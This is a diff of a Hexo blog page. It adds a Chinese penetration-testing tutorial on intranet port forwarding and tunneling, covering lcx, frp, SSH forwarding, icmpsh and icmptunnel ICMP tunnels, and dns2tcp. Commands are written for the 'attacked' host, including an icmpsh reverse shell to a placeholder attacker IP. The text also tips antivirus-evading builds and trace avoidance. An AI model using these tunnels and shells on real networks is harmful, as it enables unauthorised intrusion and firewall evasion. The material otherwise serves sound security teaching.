@@ -5,7 +5,7 @@
 <head>
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
     <meta name="keywords" content="内网渗透专题（四）, HTML,CSS,JavaScript,JQuery,java,linux等">
-    <meta name="description" content="内网渗透比较系统的讲解">
+    <meta name="description" content="浅析内网端口转发和隧道代理">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -454,21 +454,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-04-16
+                    2022-05-01
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    4.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    15 分
                 </div>
                 
 
@@ -486,7 +486,174 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <p>在进行渗透测试过程中会遇到到内网中的其他机器是不允许外网机器访问的，因此需要通过端口转发(即隧道)或将得到的外网服务器设置为代理，使得攻击机可以直接访问并操作内网中的其他机器，这一过程就叫做内网转发。</p>
+<h4 id="为什么不直接远程登录？"><a href="#为什么不直接远程登录？" class="headerlink" title="为什么不直接远程登录？"></a>为什么不直接远程登录？</h4><p>大部分时候拿到权限不够，无法直接登录</p>
+<p>而且如果在内网服务器中进行操作，我们需要上传工具进行很多操作，如果服务器缺少对应的环境变量或者组件，会导致渗透受阻。</p>
+<p>而且直接远程登录会留下比较明显的痕迹。</p>
+<p>因此内网转发是我们最好的选择，在本地进行操作是最方便的，也比较安全。</p>
+<h4 id="端口映射"><a href="#端口映射" class="headerlink" title="端口映射"></a>端口映射</h4><p>端口映射是将一台主机的内网(LAN)IP地址映射成一个公网(WAN)IP地址，当用户访问提供映射端口主机的某个端口时，服务器将请求转移到本地局域网内部提供这种特定服务的主机。</p>
+<h4 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h4><p>利用各种隧道技术，寻找防火墙允许的协议，混杂在正常流量中穿透，绕过网络防火墙的封锁，实现访问被封锁的目标网络。</p>
+<h2 id="Socket协议和Socks协议"><a href="#Socket协议和Socks协议" class="headerlink" title="Socket协议和Socks协议"></a>Socket协议和Socks协议</h2><h4 id="socket协议"><a href="#socket协议" class="headerlink" title="socket协议"></a>socket协议</h4><blockquote>
+<p>socket 被翻译为“套接字”，是计算机之间进行通信的一种约定或一种方式。通过 socket 这种约定，一台计算机可以接收其他计算机的数据，也可以向其他计算机发送数据。</p>
+</blockquote>
+<h4 id="Socks协议"><a href="#Socks协议" class="headerlink" title="Socks协议"></a>Socks协议</h4><blockquote>
+<p>Socks 是一种会话层代理协议，设计的最初目的是帮助授权用户突破防火墙的限制，获取普通用户不能访问的外部资源。考虑到几乎所有基于 TCP/IP 的应用软件都使用 socket 进行数据通信，为了便于应用软件的设计和开发，该协议针对 socket 中几种经典操作进行了针对设计，并将其定名为 Socks广泛使用的协议版本是 Socks4 和 Socks5</p>
+</blockquote>
+<p><strong>协议过程</strong></p>
+<blockquote>
+<ol>
+<li>客户端连接上代理服务器之后需要发送请求告知服务器目前的socks协议版本以及支持的认证方式。</li>
+<li>代理服务器收到请求后根据其设定的认证方式返回给客户端</li>
+<li>如果代理服务器不需要认证，客户端将直接向代理服务器发起真实请求</li>
+<li>代理服务器收到该请求之后连接客户端请求的目标服务器</li>
+<li>代理服务器开始转发客户端与目标服务器之间的流量</li>
+</ol>
+</blockquote>
+<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><h4 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h4><p>正向代理即是客户端代理, 代理客户端, 服务端不知道实际发起请求的客户端，正向代理类似一个跳板机（VPN)。</p>
+<p>主要用途：</p>
+<ol>
+<li>访问到原来访问不到的资源</li>
+<li>可以做缓存，加速访问资源</li>
+<li>代理可以对外隐藏用户信息</li>
+</ol>
+<h4 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h4><p>反向代理指的是服务器端代理，代理服务器，客户端不知道实际提供服务的服务器。<br>以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。</p>
+<p>作用：</p>
+<ol>
+<li>保证内网安全，防止Web攻击，大型网站，通常将反向代理作为公网访问地址，Web服务器是内网。</li>
+<li>实现负载均衡，优化网站的负载</li>
+</ol>
+<p>访问路径：</p>
+<pre class="line-numbers language-\\" data-language="\\"><code class="language-\\">Lhost&lt;－－&gt;proxy&lt;－－&gt;firewall&lt;－－&gt;Rhost<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h2 id="内网代理转发的方式"><a href="#内网代理转发的方式" class="headerlink" title="内网代理转发的方式"></a>内网代理转发的方式</h2><h3 id="NC连接"><a href="#NC连接" class="headerlink" title="NC连接"></a>NC连接</h3><p>在渗透小tips（一）中有写。</p>
+<h3 id="LCK端口转发"><a href="#LCK端口转发" class="headerlink" title="LCK端口转发"></a>LCK端口转发</h3><p>lcx.exe是一个端口转发工具，有Windows版和Linux版两个版本，Windows版是lcx.exe,Linux版为portmap。</p>
+<p><strong>内网主机上执行：lcx.exe –slave 公网主机ip 公网主机端口 内网主机ip 内网主机端口</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">lcx.exe -slave 公网主机ip 4444 127.0.0.1 3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>意思是把内网主机的 3389 端口转发到具有公网ip主机的 4444 端口</p>
+<p><strong>公网主机 上执行 Lcx.exe –listen 公网主机端口1 公网主机端口2</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">lcx.exe –listen 4444 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>意思是监听公网主机本机的 4444 端口请求，并将来自 4444 端口的请求传送给 5555 端口。</p>
+<p>打开windows远程连接，如果是在公网主机上操作，计算机那栏只需要输入 127.0.0.1:5555，即可；如果是在本地主机上操作，则输入 公网主机ip:5555 ，然后输入用户名和密码，即可连接到内网主机。</p>
+<h4 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h4><p>由于防火墙限制，部分端口如3389无法通过防火墙，此时可以将该目标主机的3389端口透传到防火墙允许的其他端口，如53端口，</p>
+<p>目标主机上执行：</p>
+<pre class="line-numbers language-none"><code class="language-none">lcx -tran 53 目标主机ip 3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这时我们可以直接远程桌面连接到到 目标主机IP:53。</p>
+<p>此软件会被杀，需要免杀版本。</p>
+<h2 id="frp内网穿透"><a href="#frp内网穿透" class="headerlink" title="frp内网穿透"></a>frp内网穿透</h2><p>工具地址： <a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p>
+<p>frp的作用：</p>
+<blockquote>
+<p>利用处于内网或防火墙后的机器，对外网环境提供 http 或 https 服务。</p>
+<p>对于 http, https 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个80端口。</p>
+<p>利用处于内网或防火墙后的机器，对外网环境提供 tcp 和 udp 服务，例如在家里通过 ssh 访问处于公司内网环境内的主机。</p>
+</blockquote>
+<p>配置一下服务端和客户端。</p>
+<h2 id="SSH隧道代理"><a href="#SSH隧道代理" class="headerlink" title="SSH隧道代理"></a>SSH隧道代理</h2><p>SSH隧道代理或SSH端口转发是一种在客户端和服务器之间创建加密SSH连接的方法，通过SSH隧道连接可以中继服务端口。</p>
+<p>SSH转发对于传输未使用加密协议的服务（例如VNC或FTP），访问受地理限制的内容或绕过中间防火墙的网络数据很有用。基本上，您可以转发任何TCP端口并通过安全的SSH连接建立隧道。</p>
+<p>三种类型的SSH端口转发：</p>
+<ul>
+<li>本地端口转发。 -连接从客户端主机转发到SSH服务器主机，然后转发到目标主机端口。</li>
+<li>远程端口转发。 -将端口从服务器主机转发到客户端主机，然后转发到目标主机端口。</li>
+<li>动态端口转发。 -创建SOCKS代理服务器，该服务器允许跨多个端口进行通信。</li>
+</ul>
+<p>ssh本地端口转发命令为：</p>
+<pre class="line-numbers language-none"><code class="language-none">ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>从本地的端口发出请求，通过这台机器作为跳板转发请求到的端口。 是相对而言的，比如是127.0.0.1的话，就是本身。 所以一般如果是127.0.0.1的话，跳板机或者代理服务器就是目标服务器。</p>
+<p>举个例子：</p>
+<ol>
+<li>A是一台在我家的机器macbook air，它可以访问taobao，也就是服务器C</li>
+<li>B是一台在公司的机器imac，由于在公司的内网，所以在家的A访问不到B</li>
+<li>C是taobao的服务器，公司不让上taobao，所以服务器B访问不了C</li>
+</ol>
+<p>现在要想在让B服务器能访问C的80端口，由于防火墙这条路本身是走不通的，但是由于B能访问A，A能访问C，所以能把A作为代理服务器实现这一要求。</p>
+<p>在服务器B和服务器A之间建立ssh隧道，在SSH端口转发中，由于服务器B能连接到服务器A，并且请求是从服务器B发出，所以B既是ssh的client，也是请求的客户端 所以此时应该在B上去运行ssh的本地转发命令: <code>ssh -L 8080:HOST_C:80 HOST_A</code></p>
+<h4 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h4><p>要创建远程端口转发，请将<code>-R</code>选项传递给<code>ssh</code>客户端：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -R <span class="token punctuation">[</span>REMOTE:<span class="token punctuation">]</span>REMOTE_PORT:DESTINATION:DESTINATION_PORT <span class="token punctuation">[</span><span class="token environment constant">USER</span>@<span class="token punctuation">]</span>SSH_SERVER<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li><code>[REMOTE:]REMOTE_PORT</code>-远程SSH服务器上的IP和端口号。空的<code>REMOTE</code>IP地址表示远程SSH服务器将在所有接口(有的计算机会有多个网卡)上绑定。</li>
+<li><code>DESTINATION:DESTINATION_PORT</code> -目标计算机的IP或主机名和端口。</li>
+<li><code>[USER@]SERVER_IP</code> -远程SSH用户和服务器IP地址。由于本身B是可以访问A的，但是A访问不到B，现在要想服务器A访问到B，也就是在家能连上公司的机器。</li>
+<li>服务器B能连上A，所以B应该是ssh的client，此时请求是由A发起的，所以A是请求客户端，方向不同，所以是远端转发。 因此在B上运行命令: <code>ssh -R 2222:127.0.0.1:22 HOST_A</code> ,这里127.0.0.1是因为通过A服务器转发的目的服务器就是A本身。 这样在A上的2222端口就映射到了B的22端口。</li>
+</ul>
+<h4 id="动态端口转发"><a href="#动态端口转发" class="headerlink" title="动态端口转发"></a>动态端口转发</h4><p>不管是本地转发还是远端转发，都需要一个具体的应用服务器的地址和端口号，要想访问其他机器的内容就得绑定很多条这样的转发命令， 通过动态转发就能省去这一个应用服务器的信息。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -D <span class="token operator">&lt;</span>local port<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>SSH Server<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>当我们在一个不安全的 WiFi 环境下上网，用 SSH 动态转发来保护我们的网页浏览等信息无疑是十分必要的。 比如在本机运行： <code>sh -D 7001 &lt;SSH Server&gt;</code> 这样就相当于通过创建了一个SOCKS代理。</p>
+<h2 id="ICMP隧道代理"><a href="#ICMP隧道代理" class="headerlink" title="ICMP隧道代理"></a>ICMP隧道代理</h2><p>ICMP协议不需要端口的开放，因为其基于IP工作的，所以我们将其归结到网络层，ICMP消息最为常见的就是ping命令的回复，将TCP/UDP数据包封装到ICMP的ping数据包中，从而穿过防火墙（通常防火墙是不会屏蔽ping数据包的）。</p>
+<h4 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h4><p> 被攻击的服务器端运行</p>
+<pre class="line-numbers language-none"><code class="language-none">icmpsh.exe -t（攻击者IP）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p> 攻击者端运行<code>icmpsh</code>的控制端</p>
+<pre class="line-numbers language-none"><code class="language-none">python icmpsh_m.py（攻击者IP）192.168.1.113（被攻击者IP）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="icmptunnel"><a href="#icmptunnel" class="headerlink" title="icmptunnel"></a>icmptunnel</h4><p>icmptunnel的优势在于可以穿过状态防火墙或NAT</p>
+<p> 一些设备会过滤没有匹配响应数据包的 Ping 包。而在非对称连接中，来自服务器端的流量会大于客户端，反之亦然，这样客户端可能会丢弃一些相应数据包，因为响应数据包多余请求数据包。</p>
+<p> icmptunnel 有一个机制来专门解决这个问题。客户端会定期发送一个空的 ICMP 请求数据包给状态防火墙或 NAT，而这些请求数据包都会被记录在防火墙状态表中。同时通过保持发送带有载体的数据包，这样客户端会维持一个可以用于服务器端发送数据的“数据包窗口”。</p>
+<p>攻击者开启icmptunnel服务端模式：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">&gt;</span> /proc/sys/net/ipv4/icmp_echo_ignore_all
+ ./icmptunnel –s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p> 然后另开一个终端，执行命令</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/sbin/ifconfig tun0 <span class="token number">10.0</span>.0.1 netmask <span class="token number">255.255</span>.255.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p> 指定一个网卡tun0，用于给隧道服务器端分配一个IP地址(10.0.0.1)。</p>
+<p> 被攻击者</p>
+<pre class="line-numbers language-none"><code class="language-none">echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all
+ ./icmptunnel 攻击者IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>连接上攻击者的icmptunnel服务端，然后再开一个终端，执行命令</p>
+<pre class="line-numbers language-none"><code class="language-none">/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>指定IP为10.0.0.2。</p>
+<h2 id="DNS隧道代理"><a href="#DNS隧道代理" class="headerlink" title="DNS隧道代理"></a>DNS隧道代理</h2><p>当我们的HTTP、HTTPS这样的上层协议、正反向端口转发都失败的时候，可以尝试使用DNS隧道。DNS隧道很难防范，平时难免会用到DNS协议进行解析，所以防火墙大多对DNS的流量是放行状态。</p>
+<p>时候，如果我们在不出网机器构造一个恶意的域名（***.test.cn），本地的DNS服务器无法给出回答时，就会以迭代查询的方式通过互联网定位到所查询域的权威DNS服务器。最后，这条DNS请求会落到我们提前搭建好的恶意DNS服务器上，于是，我们的不出网主机就和恶意DNS服务器交流上了。</p>
+<p>具体实现：将TCP/UDP数据包封装到dns的数据包中，绕过防火墙，实现出网。</p>
+<h4 id="dns2tcp"><a href="#dns2tcp" class="headerlink" title="dns2tcp"></a><strong>dns2tcp</strong></h4><p>安装工具，客户端windows和linux都可以，服务端只有linux。再需要一台vps。</p>
+<p><strong>配置DNS2TCP服务端</strong></p>
+<p>在vps中，将53端口的出站和入站都打开。将你的某个域名（这里以creke.net为例）开个二级域名a.creke.net，类型为NS，NS记录指向b.creke.net。然后将b.creke.net建立A记录指向你的Linux服务器IP（这里以1.2.3.4为例）。</p>
+<blockquote>
+<p>a.creke.net NS b.creke.net</p>
+<p>b.creke.net A 1.2.3.4</p>
+</blockquote>
+<h5 id="在-x2F-etc目录建立一个名为dns2tcpd-conf的文件，然后输入以下配置："><a href="#在-x2F-etc目录建立一个名为dns2tcpd-conf的文件，然后输入以下配置：" class="headerlink" title="在/etc目录建立一个名为dns2tcpd.conf的文件，然后输入以下配置："></a><strong>在/etc目录建立一个名为dns2tcpd.conf的文件，然后输入以下配置：</strong></h5><blockquote>
+<p>listen = 1.2.3.4（Linux服务器的IP）<br>port = 53<br>user = nobody<br>chroot = /var/empty/dns2tcp/<br>domain = a.creke.net（上面配置NS记录的域名）<br>resources = ssh:127.0.0.1:22,socks:127.0.0.1:1082,http:127.0.0.1:8082</p>
+</blockquote>
+<p>客户端在本地监听一个端口，并指定使用的资源，当有数据往端口传送后，dns2tcp客户端将数据用DNS协议传动到服务器，然后服务器将数据转发到对应的资源配置的端口中。</p>
+<p>等待a.creke.net的NS记录生效后，才能够继续正常使用客户端。</p>
+<p>攻击者执行</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dns2tcpd -f /etc/dns2tcpd.conf -F -d <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>侦听53端口，启动配置文件里所配置的资源，等待客户端来连接。</p>
+<p>被攻击者执行</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./dns2tcpc.exe <span class="token punctuation">(</span>-d key<span class="token punctuation">)</span> -r <span class="token function">ssh</span> -z a.creke.net 服务器IP -l <span class="token number">5353</span> -c -d <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>-d key是可选项，只要看服务端的conf文件是否配置了key</p>
+<p>-l 5353 是本地的5353端口，侦听本地5353端口使用ssh资源，如果有数据产生，将通过DNS服务器将数据转发到VPS。</p>
+<p><strong>使用ssh连接本地7002端口，也就是连接服务器53端口，然后服务器在转发给22端口。</strong></p>
+<p>这里我们也可以结合ssh动态端口转发命令，就可以配置浏览器进行代理上网。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -CfNg  -D <span class="token number">8080</span>  root@127.0.0.1 -p <span class="token number">5353</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><h4 id="代理还是端口转发？"><a href="#代理还是端口转发？" class="headerlink" title="代理还是端口转发？"></a>代理还是端口转发？</h4><p>需基于渗透场景去选择，若以边界机器为流量跳板，对内网进行渗透，这时我们需要用到很多渗透工具，若一个个上传渗透工具到边界机器，则太麻烦，顾在这种情况，代理优于端口转发；若只需访问内网某端口，那么代理跟端口转发都可。</p>
+<h4 id="正向代理还是反向代理？"><a href="#正向代理还是反向代理？" class="headerlink" title="正向代理还是反向代理？"></a>正向代理还是反向代理？</h4><p>需基于渗透场景去选择，若边界机器存在公网IP，那么正反代理都可用，若边界机器不存在公网IP，那么只能用反向代理；若边界机器存在防火墙，则一般会拦截主动访问边界机器的流量，这时需要选择反向代理。总的来说，部分场景下正向代理有限制，反向代理都可实现，反向代理优于正向代理。</p>
+<h4 id="代理转发隧道选择？"><a href="#代理转发隧道选择？" class="headerlink" title="代理转发隧道选择？"></a>代理转发隧道选择？</h4><p>主要基于两点：一：出网协议；二：出网端口；根据边界机器支持的出网协议和出网端口来选择到底使用什么代理转发隧道，例如果边界机器协议都支持，那么可以可以自由选择，如果边界机器只支持ICMP协议，那么只能选择ICMP协议做代理转发隧道。</p>
+<p>判断边界机器出网协议：</p>
+<pre class="line-numbers language-none"><code class="language-none">1.ICMP:	ping www.baidu.com
+2.TCP:	nc -n IP por3.HTTPcurl IP:port   
+4.nslookup &lt;域名&gt; &lt;DNS IP&gt;  			#windwos
+	dig @&lt;DNS IP&gt; &lt;域名&gt;      		#linux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="隧道都有哪些？"><a href="#隧道都有哪些？" class="headerlink" title="隧道都有哪些？"></a>隧道都有哪些？</h4><blockquote>
+<p>应用层隧道：HTTP隧道、HTTPS隧道、DNS隧道、SSH隧道<br>传输层隧道：TCP隧道、UDP隧道<br>网络层隧道：ICMP隧道、IPV6隧道、GRE隧道</p>
+</blockquote>
+
                 
             </div>
             <hr/>
@@ -955,7 +1122,7 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            内网渗透比较系统的讲解
+                            一些综合性问题
                         
                     </div>
                     <div class="publish-info">
